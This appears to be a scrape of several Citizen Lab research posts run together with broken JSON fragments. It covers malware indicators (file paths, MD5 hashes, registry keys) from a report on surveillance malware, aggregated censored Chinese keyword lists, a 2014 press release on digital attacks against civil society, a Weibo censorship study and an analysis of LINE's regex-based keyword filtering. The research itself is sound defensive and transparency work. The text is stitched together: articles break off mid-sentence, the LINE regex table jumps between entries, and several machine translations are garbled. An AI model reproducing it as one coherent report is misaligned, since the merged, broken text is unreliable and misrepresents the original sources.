Path\nMD5\n\n\nC:\\Users\\[Username]\\AppData\\Local\\Temp\\IXP000.TMP\\AdobeR1.exe (note: folder and file deleted after slideshow closed)\naa6bcba23cd39c2827d72d33f5104856\n\n\nC:\\Users\\[Username]\\AppData\\Local\\Temp\\IXP000.TMP\\pictures.exe (note: folder and file deleted after slideshow closed)\neda83c8e4ba7d088593f22d56cf39d9f\n\n\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdbrRader.exe\n9d36e8e3e557239d7006d0bb5c2df298\n\n\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdobeIns.exe\n1d5d8c5ce3854de61b28de7ca73093f1\n\n\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GoogleUpate.exe\n55039dd6ce3274dbce569473ad37918b\n\n\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GooglUpd.exe\nefdd9b96ae0f43f7d738ead2e1d5430c\n\n\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\n0e3eb8de93297f12b56de9fc33657066\n\n\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvisdvr.exe\n3eb6f95c321ace0e3b101fd7e2cdd489\n\n\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\rundl132.exe\n84bbd592a212f5a84923e82621e9177d\n\n\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\ svhosts.exe\n13caa1c95e6610f2d5134174e1fb4fd0\n\n\n\nCollected Information Files (unencrypted)\n\n\n\nFilename and Path\n\n\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\v2cgplst.tmp\n\n\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vg2sxoysinf.tmp\n\n\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vgadmysadm.tmp\n\n\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vgosysaext.tmp\n\n\n\nExfiltrated file (encrypted)\n\n\n\nFilename and Path\n\n\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\drv.sys\\mxtd\n\n\n\nRegistry Keys\n\n\n\nFilename and Path\n\n\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K1F-DKV8J-FKVJI-GVKBU\\1\n\n\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K2F-DKV8J-FKVJI-GVKBU\\2\n\n\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K3F-DKV8J-FKVJI-GVKBU\\3\n\n\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K4F-DKV8J-FKVJI-GVKBU\\4\n\n\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K6F-DKV8J-FKVJI-GVKBU\\6\n\n\n\nAcknowledgements\nAcknowledgements: We are grateful to Cyber Arabs and the Institute for War and Peace Reporting for their critical work and assistance.\nSpecial thanks to: several anonymous Syrians, Masashi Crete-Nishihata, Sarah McKune, Morgan Marquis-Boire, Ron Deibert, Bill Marczak, Nart Villeneuve, Irene Poetranto, and Kristen Dennesen.\nSupport for this research is provided by grants from the John D. and Catherine T.

    "text": "\n\t\t\t\tBy Jason Q. Ng\nDuring The Citizen Lab’s 2014 Summer Institute on Monitoring Internet Openness and Rights, a researcher expressed desire to test for keyword censorship on a Chinese online service. With limited resources and time, however, the researcher faced difficulty in determining what keywords should be used for these tests.\nAs lists of censored and sensitive Chinese keywords exist on the web, including sets produced by The Citizen Lab itself, this is a problem that has long been “solved.” However, keyword lists can be overly inclusive and have too many terms for time-strapped researchers to efficiently utilize. Furthermore, pulling out only the most sensitive keywords to test—e.g., Falun Gong, June 4, and Xi Jinping—while also ensuring that the keywords cover a broad range of topics, can be quite difficult, even for researchers familiar with the Chinese online sphere. For those not experienced in Chinese or Internet censorship, it is certainly a daunting task. Researchers must first locate these scattered lists, and then winnow them down to something more usable.\nTo assist researchers faced with these problems, we have collected 13 lists of sensitive Chinese keywords and aggregated them into a single, sortable, and share-able CSV file (see a Google docs sample, sorted by the number of lists each keyword appears on). This file, along with a description of the 13 lists and their sources/origins, are located in a GitHub repository that will be updated as new Chinese keyword lists are identified.\nThe 13 lists contain 9,054 unique keywords, including those in Chinese, English, pinyin, or a combination of the three. The lists go back as early as 2004 (the leaked Tencent QQ blacklist) and were produced as recently as November 2014 by Citizen Lab collaborator Jeffrey Knockel (University of New Mexico), who extracted 910 keywords from Sina Show. The keyword 魏京生, the name of human rights activists Wei Jingsheng, was found on every list, and four keywords–柴玲 (the June 4 student leader Chai Ling), 六四 (64, referring to June 4), 美国之音 (Voice of America), and 太子党 (princelings, referring to the children of government officials)–were on twelve of the thirteen lists.\nThe CSV file contains machine translations from Google and human translations/notes for most of the keywords. Many also have theme and category variables included, due to various sources that have previously tagged their keyword lists.\nCurrently, there are three different versions:\n\nall.csv: All the keywords, all available data/variables, plus 3,987 popular (3,803 non-sensitive) keywords which can be used as possible controls for searching. These popular/non-sensitive keywords were taken from article titles of the top 1000 most viewed articles on Wikipedia China in April 2013 (995 after a few Wikipedia meta-pages were removed) and titles of articles that generated more than a total of 10 combined views on August 1, 0:00-1:00 and 12:00-13:00.\nno-dummy-vars-for-categories-and-themes.csv: All the keywords without dummy variables for each of the themes and categories that were tagged by The Citizen Lab. Category/theme info is instead stored in catch-all “category” and “theme” variable (column).\nno-dummy-vars-for-categories-and-themes_only-sensitive-words.csv: Same as above, except also with the non-sensitive words removed. Once downloaded, you can also sort by keyword length as well as how many of the lists each keyword appears on.\n\nThe thirteen lists this collection combines are:\n\n\n\nCreator/source\nTested on/found from\nNumber of keywords\nYear\nMethod + source\n\n\n\n\nUniversity of New Mexico / The Citizen Lab\nSina UC\n1,818\n2013\nreverse engineered from the client; analysis here; download link\n\n\nUniversity of New Mexico / The Citizen Lab\nTom-Skype\n2,574\n2013\nreverse engineered from the client; analysis here; download link\n\n\nThe Citizen Lab\nLINE\n673\n2014\nreverse engineered from the client; analysis here; download link\n\n\nJason Q.

    "text": "\n\t\t\t\tTranslations: Read the report in Tibetan.\nMedia coverage: UofT News, Associated Press, Washington Post, CBC News, The Globe and Mail, NBC News, ABC News, Mashable, Boing Boing, Motherboard, Computerworld, The Hill, The Epoch Times, Help Net Security, IT World Canada, IT Security Guru, VPN Creative, CBC Radio’s Spark (audio), Radio Canada (audio in French), and Wired Germany (in German).\nFOR IMMEDIATE RELEASE\nDownload press release [PDF]\nToronto, Canada (November 11, 2014) – Civil society organizations (CSOs) that work to protect human rights and civil liberties around the world are being bombarded with the same persistent and disruptive targeted computer espionage attacks reportedly hitting industry and government. Unlike industry and government, however, civil society organizations have far fewer resources to deal with the problem and rarely receive the same attention as the former. These attacks on civil society raise major issues for the sustainable promotion of rights and democracy worldwide.\nThese and other findings are detailed in a major new report published today by the Citizen Lab, an interdisciplinary research laboratory based at the University of Toronto’s Munk School of Global Affairs.\nThe report, entitled “Communities @ Risk: Targeted Digital Threats Against Civil Society,” involved 10 civil society groups that enrolled as study subjects over a period of four years. The Citizen Lab study sought to obtain greater visibility into an often overlooked digital risk environment affecting–whether they know it or not–many of society’s most essential institutions. The participating CSOs shared emails and attachments suspected of containing malicious software, network traffic, and other data with Citizen Lab researchers, who undertook confidential, detailed analysis. Citizen Lab researchers also paid site visits to the participating CSOs, and interviewed them about their perceptions and the impacts of the digital attacks on their operations. Data from both the technical and contextual aspects of the research informs the report’s main findings.\n“The “Communities @ Risk” report represents a major systematic effort to identify the type of digital attacks vexing human rights and other civil society organizations,” explains Ron Deibert, Director of the Citizen Lab. “It is well known that computer espionage is a problem facing Fortune 500 companies and government agencies. Less well known and researched, however, are the ways in which these same type of attacks affect smaller organizations promoting human rights, freedom of speech, and access to information. We set out to fill this gap in knowledge.”\nAmong the other main findings of “Communities @ Risk,” Citizen Lab researchers found that the technical sophistication of even the most successful attacks against CSOs tends to be low. Instead, attackers put more significant time and effort into crafting legitimate-looking email messages or other “lures” designed to bait targets into opening attachments or clicking on links (also known as social engineering). The content for these lures is often derived from information gathered from previous breaches of individuals in their organization or partners in their wider communities. Constant use of socially engineered attacks as bait erodes trust among those communities and creates disincentives around using the very communication technologies that are often seen as CSOs’ greatest asset.\nOver a four-year period, researchers watched as attackers modified their malicious software and other attack techniques based on the CSOs’ choices of operating systems and other platforms, which indicates the persistent and evolving nature of targeted digital threats. The report also underscores the transnational dimension of targeted digital threats on CSOs. Targeted digital threats provide means for a powerful threat actor, such as a state, to extend its reach beyond borders and into “safe areas,” monitoring exiled journalists, diaspora, and human rights groups as if they were within physical proximity.\nThe report argues that solving the problem will require major efforts among several stakeholders, from the foundations that fund civil society, to the private sector, to governments.\nFunders are in a unique position to support grantees in making measurable improvements to their organizational security, but must first take steps to properly evaluate digital risks to both themselves and their grantees.\nCompanies that build software or provide information security have an obligation to support CSOs at risk, and the report recommends they explore a “pro bono” model of help as well as creative licensing solutions for CSOs to avoid the use of insecure, outdated software.\nFinally, governments that support the right to privacy and freedom of expression online should take steps to raise the profile of targeted digital threats against civil society in their domestic policy and diplomacy, “treating the matter as of equal priority to their defense of the private sector.”\nThe full report, including detailed technical data related to “Communites @ Risk,” can be found at https://targetedthreats.net/\nFor media inquiries, please contact Irene Poetranto at irene.poetranto@utoronto.ca.\nThe Citizen Lab’s research into targeted digital threats is supported by a generous grant from the John D. and Catherine T. MacArthur Foundation (Ronald Deibert, Principal Investigator).\n\n\t\t\t\t\n\t\t\t",

    "description": "Summary:",
    "text": "\n\t\t\t\tBy Jason Q. Ng\n\nSummary:\n\nPart 1: Weibo has removed their conventional censorship notice from searches on the site. This may be a bellwether for enhanced censorship on the site due to a particularly sensitive period in Chinese politics or it may mark a shift toward more obscured censorship. Or it may simply be Weibo testing out new tactics.\nPart 2: Automatic review of content refers to moderating messages before they get circulated widely. A number of studies have described these mechanisms, which include keywords which trigger your post to become hidden or your inability to post in the first place. We sought to outline with more clarity the pathways a Weibo post might take—from submission to potential censorship.\nPart 3: We accomplished the above by posting sensitive keywords and tracking how they were censored or not based on a number of factors. This is only a preliminary set of tests and will hopefully serve as a basic methodology for others who are interested to generate more rigorous testing.\nData and screenshots: We’ve posted to Github the data used for this test, lists of suspected keywords which trigger automatic review, as well as the screenshots of the various censorship messages.\n\n\n\nPart 1: Removal of Censorship Notice from Weibo Searches\nInternet censorship watchers have long noted the ubiquity of the phrase “根据相关法律法规和政策，搜索结果未予显示” on Chinese websites. That message (“According to relevant laws, regulations, and policies, search results cannot be displayed”) or one of its variants often accompanies search results that have been filtered or censored by Chinese search engines and content providers. While much of China’s censorship system is by design invisible or obfuscated, this notice has served both as a small beacon of transparency as well as a chilling reminder that authorities are in control of the information one sees on Chinese websites.\nHowever, as of two weeks ago, Sina Weibo, a popular Chinese microblogging website, stopped explicitly reporting when its search results were censored, and instead, the site now returns a message stating that no results are found when a user searches for sensitive content. Search results for terms like 习近平 (Xi Jinping, the president of China) have long been filtered without the user’s knowledge (returning only sanitized results) and users of the service oftentimes don’t receive messages when their posts are rendered invisible (see Part 2). The removal of any acknowledgment of filtering during searches is another way of making censorship harder to easily detect.\nTiming\nThis is not the first time Weibo has removed the censorship messages from searches for sensitive terms and reported “no results” instead. From November 1 to November 8 of 2012, Weibo used the same tactic to obscure its censorship. However, since November 2012 up until last month, Weibo has displayed the conventional censorship message, though with various increased efforts to filter its results during especially sensitive events like the June 4th anniversary in 2013.\nAccording to our monitoring logs, this most recent removal began at roughly 9:05 pm EST on Oct 16 (10:05 am Beijing time on Oct 17). Since then, searches for sensitive keywords have returned zero results as opposed to a censorship message.\nThe timing of the first removal in 2012 occurred in the lead up to the 18th Party Congress, a once-a-decade transition of power in the Communist Party leadership and an especially sensitive event in China. Reports at the time noted of the extreme measures officials took to ensure the event would proceed smoothly—including the cancellation of theater performances, banning of kitchen knife sales, and the locking of taxi windows in Beijing. Following that logic, the decision to take extra measures to control the sharing and dissemination of criticism in the online sphere would make sense, and the removal of the censorship notice was likely only the most obvious change taken to prevent disruptions.\nThis latest removal again took place in the lead up to an important meeting of the Communist Party. The Fourth Plenum of the 18th CCP Central Committee occurred on October 20 to October 23, 2014. However, unlike the 2012 instance, censorship notices did not return to Weibo just before the start of the event, and instead, lasted through the duration of the meetings. It’s possible the latest iteration may in fact be tied to another sensitive event: the APEC summit (Asia-Pacific Economic Cooperation) in Beijing on November 10 – 11, which world leaders like Barack Obama and Xi Jinping attended. Protesters currently occupying Hong Kong had initially suggested they might attend the summit, potentially making it even more sensitive, however, they have since postponed their visit to Beijing.\nAnalysis\nTo confirm the removal of the censorship message, we re-tested a sample of 2,429 sensitive keywords compiled by China Digital Times. This sample was last tested in its entirety on May 10 – 12, 2014, and yielded 822 keywords which were explicitly censored (“According to relevant laws, regulations, and policies, search results cannot be displayed”), 693 of whom had unique keywords which triggered their censorship (六四, literally the numbers “six” and “four” refer to the crackdown on demonstrators in Beijing on June 4, 1989; 六四学运, “June 4 Student Movement,” is similarly censored, but is not considered a unique censored keyword). Sina Weibo indicated there were zero results for only ten of the tested keywords (“Sorry, unable to find related results”).\nWe submitted the same 2,429 keywords through Weibo search engine on November 3 – 4. As expected based on preliminary testing, none of the keywords returned the censorship message. This time, there was a vast increase in keywords returning the “Sorry, unable to find related results” message (from 10 in our May test to 784). While a handful of those 784 keywords may genuinely have no results because they have not been used in Weibo posts, 754 of those 784 were in fact previously censored, a strong indication that searches for common terms yielding “no results” are in fact being censored.\nAs for the implications of the removal of the explicit censorship notice, we wrote previously in Tea Leaf Nation that:\nWhether full-scale or piecemeal, the reduction of blanket keyword blocks is paradoxically a loss of transparency, since Chinese users no longer explicitly know when certain results are being specifically targeted for censorship . . . What is and is not off-limits has now become slightly harder to determine—another step in making censorship invisible and all-pervasive.\nIt will be worth following to see whether this change is permanent or merely temporary as in November 2012 and June 2013. If the explicit censorship notices return, we might surmise that tweaks to these censorship notices serve as a bellwether for particularly sensitive periods. More enhanced censorship may be occurring behind the scenes during these periods, but that will require more monitoring to confirm. Or it may simply be that Weibo is testing out new tactics.\n\nPart 2: Pathways for Censoring a Weibo Post\nA number of significant articles in recent years have done a great deal to illuminate how Weibo messages are censored before and after they are posted. Zhu, Phipps, Pridgen, Crandall, and Wallach’s “The Velocity of Censorship: High-Fidelity Detection of Microblog Post Deletions” (presentation) noted that “Weibo has filtering mechanisms as a proactive, automated defense” and outlined these measures: explicit filtering (not allowing a user to post messages containing certain keywords), implicit filtering (alerting the user that a “data synchronization” issue would temporarily keep the message from being posted immediately), and camouflaged posts (a user is able to successfully post a message and it appears on their own timeline, but other users looking at that same timeline won’t see it). These measures are not new; Jason Ng blogged about “vanishing posts” back in 2011 (English summary).\nBamman, O’Connor, and Smith (“Censorship and deletion practices in Chinese social media”) along with King-wa Fu and his colleagues at the University of Hong Kong (“Assessing Censorship on Microblogs in China: Discriminatory Keyword Analysis and the Real-Name Registration Policy”) have delved deeply via Weibo’s API into identifying the deletion of posts after they’ve been submitted.\nKing, Pan, and Roberts recent Science article (“Reverse-engineering censorship in China: Randomized experimentation and participant observation”) pays much needed attention to how employees working at Internet companies actually implement the systems for performing online censorship. The paper offers insight into the various options online content providers have for trying to ensure only acceptable material is viewable on the website, including the various “automated review” features.\nAs mentioned above, Weibo implements a number of automated review features, including many of those listed in Table 1 of King. Weibo posts also follow a similar lifespan to the pathways listed in Figure 1 of King, with some variations. Based on testing we performed (see Part 3), we identified the typical ways a message can be filtered or deleted on Weibo.\nFig 1. Possible pathways for a Weibo post\nMore explanation about some of the paths (see “Screenshots” below for images of these notices):\n\n1) User submits a message with keywords on the explicit filtering blacklist. They receive a message “Sorry, this content violates … regulated regulations and policies. Operation cannot be specified.” (“抱歉，此内容违反了《微博社区管理规定(试行)》或相关法规政策，无法进行指定操作。查看帮助：http://t.cn/8sYl7QG。”) The user must remove the blacklisted keyword before being able to post. The submission is censored.\n2A) If the post contains certain keywords, it may be automatically and instantaneously held for review by becoming invisible to all outside users. From the moment it is posted until it is reviewed by a censor, the post is invisible. From our two tests, it appears to take roughly 30 minutes before judgment is rendered on a post, but the amount of time no doubt varies depending on day of week and time of day.\n3) User submits a message with keywords on the implicit filtering blacklist. They receive a message “Posted successfully. Please be patient about 1-2 minutes delay due to server synchronization, thank you.” (“你的微博发布成功。目前服务器数据同步可能会有延时，所以麻烦耐心等待1-2分钟哦，非常感谢。”)\n3A/B) As noted by Zhu, this can sometimes take hours, but in other cases, can take about 30 minutes before the post—if approved (or not disapproved) by the censors—actually appears on a user’s timeline.\n4A/B) Quite rarely in our preliminary tests is a user actually informed that they have submitted unacceptable content and that it has been deleted (see Screenshot below). One of our accounts which did receive six of these notices received a warning notice and a 48 hour ban on posting (“您好，您被其他用户举报涉嫌违规。根据《微博社区管理规定(试行)》，您的账号将被禁言48小时。查看帮助：http://t.cn/8s9ROKhc”), but no others did. Much more common is for posts to be rendered invisible (just as they were in 2A1) with no notice given to the user at all.\n4C) Simply deleting a user’s account was quite common in our preliminary tests. It sometimes occurred hours after the account finished posting any messages, and sometimes occurred within seconds. The user was occasionally offered the opportunity to recover their account by submitting an appeal. However, due to the types of accounts used for the study and style of submitting content, we likely experienced much higher than typical rates of account deletion (as opposed to King who crafted genuine looking posts, thus likely evading banning due to certain filters looking for spam and other non-standard user behavior).\n\n\nPart 3: Keywords which Trigger Automatic Review and Project Data\nWhile both Zhu and King referred to these automated review mechanisms, they did not explicitly identify what specific keywords were on the blacklists that would trigger censorship via explicit filtering (box 1 in Figure 1), implicit filtering (box 3), and hiding of posts via “camouflage”/invisibility (box 2A). Below, are links to a Github repository with the data we have begun accumulating for tracking the keywords which trigger these three types of automatic review.\nWe performed this initial probe for the keywords which trigger these three methods of censorship by taking the 784 keywords which returned zero results from searching in the CDT list (words assumed to cause censored search results), and tried posting messages with them on Weibo. Unlike King, we did not craft realistic-looking messages. As we were just looking to identify words which would trigger automatic review, we simply posted the keyword along with a unique ID number for our own tracking purposes.\nBecause of rate limiting, we spread out the posting of these 784 keywords (which contained some duplicates) to 16 Weibo accounts registered to users in locations around the world, including Canada, the United States, France, England, Hong Kong, Macau, and mainland China. Our first test took place on November 8, Saturday morning, Beijing time and a follow-up test was run on November 10, Monday morning, Beijing time. (Each test was run using a computer in the United States; obviously, for future purposes, testing from different locations would be ideal to confirm there is no variation based on location.) We tracked the following:\n\nWhether a message with the keyword was not allowed to be posted (explicit filtering)\nWhether posting a keyword immediately returned a message stating that due to synchronization errors, the message would be posted later (implicit filtering)\nWhether a message with the keyword was immediately viewable by another user (camouflaged post)\nWhether a message with the keyword was viewable by another user one hour after being posted and 24 hours being posted\nWhether or not a user received a message in their inbox from the administrators stating a post was being deleted\nWhether or not a user’s account was suspended\n\nCaveat: the majority of the accounts we used to test for automatic review censorship were basic accounts at level 0. It’s possible another user with different privileges might have higher or lower degrees of censorship. However, we were able to consistently replicate the majority of the below results when using new accounts, and hopefully others can as well.\nIn our first test, 66 of the keywords could not be posted, including 习明泽 (Xi Mingze, the daughter of Xi Jinping), numerous variants on Zhou Yongkang’s name (a former government official under investigation for corruption), and 死八大 (a derogatory play on the term for the 18th Communist Party Congress). In our second test, the number increased slightly to 73. Though it was not identical across the two tests, there was a large overlap, with 63 of the initial 66 also being unable to be posted on the second test.\nIn our first test, 14 of the keywords triggered implicit filtering, including 北京当局 (Beijing authorities), 丁子霖 (Ding Zilin, an activist), and 中国之春 (Chinese Spring, a play on Arab Spring).  In our second test, the number increased slightly to 15. Again, though not identical, there was a large overlap, with all 14 also triggering the implicit filtering during the second test.\nIn our first test, 133 of the posts were not immediately viewable by another user (camouflaged posts). These included posts containing the keywords 5月35日 (May 35, code for June 4), 毛腊肉 (“hairy bacon,” an insult for Mao Zedong), 博讯新闻网 (Boxun News), and 坦克人 (Tank Man). 202 were hidden/deleted within 1 hour, and 273 were hidden/deleted within 24 hours. Eighteen messages regarding deletions were received and four of the sixteen accounts used for the test ended up being suspended. The numbers were roughly the same during the second test. We are less confident of the actual total number of keywords which trigger posts being deleted/hidden after one hour and 24 hours in the second test because twice as many accounts were suspended during the test, including some before the first hour had passed. Thus a greater proportion of deleted/hidden posts were attributed to account suspension and unable to be confirmed as being due to the sensitivity of the keyword itself. That said, there was still a large overlap between the two tests with regards to camouflaged posts: only 19 of the 133 camouflaged posts from the first test were subsequently viewable on the second test. Further testing should be done to identify more precisely which keywords are causing posts to be automatically held for review in this manner.\nAs a rudimentary control, we also posted 16 keywords from the CDT sensitive words list that returned results (and thus, were not fully censored by Weibo search) in the November 3rd test. We also posted the 33 chapter titles (in Chinese) of Quotations from Chairman Mao and the opening of the Gettysburg Address (in English). Not one of these keywords triggered censorship either via automatic review or were hidden/deleted in the subsequent 24 hours in either test.\n\nData\n\nPart 1: Weibo search data of CDT keywords, tested May 2014 and Nov 2014 (CSV)\nPart 2 & 3: Weibo censorship testing data of probable automatic review keywords, tested Nov 8, 2014 and Nov 10, 2014\n66 keywords which cannot be posted to Weibo according to our preliminary test (explicit filtering)\n14 keywords which return a data error (implicit filtering) \n133 keywords which cause posts to be invisible and camouflaged\n\nScreenshots:\n\nExplicit filtering message (box 1 in Figure 1): Chinese | English\nImplicit filtering message (box 3 in Figure 1): Chinese | English\nComparison of missing messages in timeline due to “camouflaged”/invisible posts (box 2A1 in Figure 1): own timeline vs when viewed by another user\nMessage when visiting deleted weibo post (box 4a in Figure 1): screenshot\nPost deletion message in inbox (box 4a in Figure 1): screenshot\nAccount warning, 48 hour ban (box 4C in Figure 1): screenshot\nAccount abnormal notice (box 4C in Figure 1): screenshot\n\nAcknowledgments\nh/t China Digital Times for noting the removal of the explicit censorship notice from searches, which spurred this brief report.\nJason Q.

    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU\nMedia coverage: ZDNet, Index on Censorship.\nOn Wednesday September 24, 2014, regionally-based keyword filtering features in the LINE chat app were updated. The most notable change is the introduction of regular expressions to the keyword list, which enables more advanced keyword matching. The addition of regular expressions demonstrates LINE Corporation’s continued commitment to filtering keywords for users based in China and a push to improve the underlying technology.\nPrevious keyword list changes\nSince October 31 2013, when we began monitoring the LINE censored keyword lists, we have observed 6 keyword list updates, with list versions numbered 20 through 25. The following table summarizes the versions of the keyword lists we have identified:\n\n\n\nList Version\nDate of change\nNotable changes\nReport\n\n\n20\nFirst seen on October 31, 2013\n\nLink\n\n\n21\nFirst seen on October 31, 2013\n\nLink\n\n\n22\n4/8/2014\n312 new keywords added, 147 keywords deleted\nLink\n\n\n23\n6/23/2014\nAddition of a single keyword\nLink\n\n\n24\n9/24/2014\nAddition of regular expressions\n\n\n\n25\n9/24/2014\nMinor update to correct extraneous spacing in some regular expressions\n\n\n\n\nIn October 2013 we first reported on regionally-based keyword filtering functionality in LINE that is enabled if a user’s account is registered to a mainland China phone number.  This analysis identified two keywords lists versions 20 and 21.\nThe April 2014 update to version 22 was the most substantial change in content we have observed. 312 new keywords were added to the list and 147 keywords were removed, leaving 535 total keywords. In this update, all of the removed keywords related to Bo Xilai, a prominent Chinese politician who was jailed for corruption while his wife was convicted of murder. The majority of the 312 new additions related to Chinese government officials or notable political events. A more thorough analysis of the keywords can be found in our April 2014 report.\nThere was a minor update to the list in June 2014, when the keyword list changed to version 23. In this update, only a single keyword (买枪  ‘buy a gun’) was added while none were removed. In our report on that development, we speculated that this unusual change may have been the result of LINE’s developers testing if the keyword list update mechanism still functioned following the reported blocking of messaging applications, including LINE and KakaoTalk, for users based in China.\nUpdated keyword list\nThe most recent changes to the list were seen on September 24, 2014. At approximately 5am EDT, list version 24 appeared. This update was followed an hour later by the introduction of version 25. Versions 24 and 25 are almost identical, with only a minor addition to a single keyword as well the removal of some extraneous spaces which were present in v24 keywords.\n6 keywords presents on v23 are removed in v24 and v25:\n\n\n\nKeyword\nPinyin\nTranslation and notes\n\n\n近平\nJìn píng\nPRC President Xi Jinping’s family name\n\n\n领导人\nLǐngdǎo rén\nLeaders\n\n\n彭丽媛\nPéng Lìyuàn\nWife of Xi Jinping\n\n\n习近平\nXí Jìnpíng\nPRC President\n\n\n习近平\nXí Jìnpíng\n(Same as above, was duplicated in v23)\n\n\n李克强\nLǐ Kèqiáng\nCurrent premier of China\n\n\n\nIt is not entirely clear why references to current Chinese leader Xi Jinping, premier Li Keqiang and Xi’s wife Peng Liyuan were removed. ‘领导人’ (‘leaders’, referring to government officials) is a commonly used term used in state media and could possibly have been removed for being too broad, although this is speculation.\nIn addition, 6 keywords were edited to remove trailing spaces present in v23 which would have prevented use of these keywords from being censored.\nRegular expressions\nVersion 24 and 25 contain a major change not seen in any of the previous lists – the addition of regular expressions. Prior versions consisted of lists of keywords that triggered blocking of messages if any of the message text matched a keyword. With regular expressions, there is now the possibility for more advanced keyword matching, as messages containing a particular keyword can be censored only if, for example, they contain another keyword. This behaviour has been seen in Chinese social media services , such as Weibo1, which has long had the ability to censor keywords containing a combination of keywords. Other reports, however, have argued that performance considerations mean China’s national level web censorship infrastructure never uses the boolean ‘OR’ operation.\nAs an example of the new regular expressions, consider this entry from list v25:\n.*(中国|李锐).*六四.*\n\nThe expression begins with ‘.*’, which means that it will match on any and all characters, including none at all. This means the matching text could be at the beginning of a message or anywhere in the middle.\nThe next section contains a pair of two-character strings, in parentheses, separated by ‘|’, the OR operator. This means that either 中国 (‘China’) or 李锐 (Li Rui, a retired government official who was openly advocated for democratic reform in China) would match this part of the regular expression.\nThis character is followed by another instance of ‘.*’, which again means it will match any and all text.\nFollowing this, is the two-character pair 六四, or ‘six four’, which is a reference to the June 4, 1989 Tiananmen Square massacre.\nFinally, it ends with another ‘.*’, meaning it would match any and all text after the two-character combination.\n\nWhat this regular expression means is that any message sent using LINE which contains either ‘中国’ or ‘李锐’ followed at any point by ‘六四’ will be blocked. This method is a more flexible and advanced mechanism for censorship than simple keyword matching, which would only block messages containing text that exactly matches the censored keyword. This new technique could potentially have the effect of reducing collateral filtering caused by overbroad keyword lists. However, minimizing overblocking depends on how the regular expression filtering is implemented. Connecting a series of commonly used keywords a through a regular expression could result in overblocking.\nIn total, there were 48 regular expressions added to keyword list v25:\n\n\n\nRegular expression\nTranslation\n\n\n.*乌鲁木齐.*(75|杀人|自由|独立|买枪).*\n* Urumqi *.

(08 | and eight) *.\n\n\n.*(08|零八).*宪章.*\n. *. (08 | and eight) * Charter *.\n\n\n\nThe expressions on this list cover many of the same topics seen in keywords contained in previous versions of the list, such as the Tiananmen Square massacre, conflict in regions with large Uyghur populations, the Jasmine revolution protests, and Tibetan self-immolations.\nThere are four new regular expressions which contain the keyword 买枪 (‘buy a gun’), all of which relate to protests and violence involving Uyghur populations in Xinjiang. As previously mentioned, the addition of this keyword was the sole change between lists v22 and v23. The original standalone keyword 买枪 is still present on v25.\nList v25 contains six new regular expressions related to protest and rallies in Hong Kong. This includes two expressions which discuss Hong Kong independence issues and protests in general terms:\n.*香港.*(独立|集会|游行|中共|民运|暴政).** Hong Kong *. (Independent | meeting | Parade | CPC | pro | tyranny) *.\n.*(独立|集会|游行|中共|民运|暴政).*香港.** (Independent | meeting | Parade | CPC | pro | tyranny). * Hong Kong *.\nThe other four regular expressions include the keyword ‘71’, which is a reference to the July 1st rallies which traditionally accompany the anniversary of the July 1, 1997 transfer of sovereignty over Hong Kong to China:\n.*71.*(集会|游行).** 71 * (rally | Parade) *.\n.*(集会|游行).*71.** (Rally | Parade) * 71 *.\n.*七一.*(集会|游行).** Seventy-one *. (Rally | Parade) *.>\n.*(集会|游行).*七一.**. (Rally | Parade) * seventy-one *.\nIt does not appear that the addition of these regular expressions relating to Hong Kong protests is directly related to the ongoing Occupy Central protests in the city. The list update occurred on September 24, 2014, several days before the protests expanded. There are also other mentions of Hong Kong rallies (such as 香港维园六四, ‘Hong Kong Victoria Park six four’, which refers to an annual event held to commemorate the Tiananmen Square massacre) still present on list v25 which date back to list v21, which we first identified in October 2013. Thus while political rallies in Hong Kong are reflected in the LINE censored keywords list, there is no indication that the September/October 2014 Occupy Central rallies are specifically targeted.\nAs evident in the above list of words relating to Hong Kong, there are attempts made to account for censored keywords that may appear in a different order in a user’s message. Regular expressions such as ‘.*七一.*(集会|游行).*’ and ‘.*(集会|游行).*七一.*’ are likely used to ensure that messages are blocked even if keywords are used in a different order.\nIn some cases there are duplications in the list which would appear to render certain regular expressions unnecessary. For example, v25 contains the keyword 六四 (‘six four’, a reference to the June 4, 1989 Tiananmen Square massacre). However, four of the newly added regular expressions contain this same keyword, such as:\n.*(64|六四).*学生.*.* (64 or ‘six four’) .* ‘student’ .*\nAs 六四 (‘six four’) is already present on the keyword list, it is redundant for any regular expressions to also contain this keyword.  Similarly, the keyword 买枪 (‘buy a gun’) is present on the list, but is also contained within four regular expressions. It is not clear why these redundant keywords remain. Although the use of regular expressions could allow for a more precise application of filtering, the continued presence of many broad keywords (such as 六四 (‘six four’) or 八九 (‘eight nine’) negates this impact.\nConclusion\nWhile most of the new keywords added to this recent update do not stray far, in terms of content, from the keywords previously seen censored for LINE users in China, the addition of regular expressions represents an advancement in the techniques used to censor content on the service. While more flexibility may allow for more precise targeting of keywords (and thus reduce overblocking from broad keywords), this will depend on how the regular expressions are implemented. This addition shows that developers continue to refine and improvement censorship mechanisms in LINE.\nResources\n\nRaw and translated keyword list data on 